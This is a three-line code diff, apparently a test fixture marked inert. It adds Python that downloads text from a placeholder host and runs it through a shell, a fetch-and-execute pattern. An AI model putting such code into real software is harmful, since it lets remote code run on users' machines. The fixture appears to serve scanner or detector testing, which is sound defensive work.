@@ -1,0 +1,3 @@
+# Inert synthetic text fixture. Never execute.
+payload = requests.get("https://example.invalid/code").text
+subprocess.run(["sh", "-c", payload])
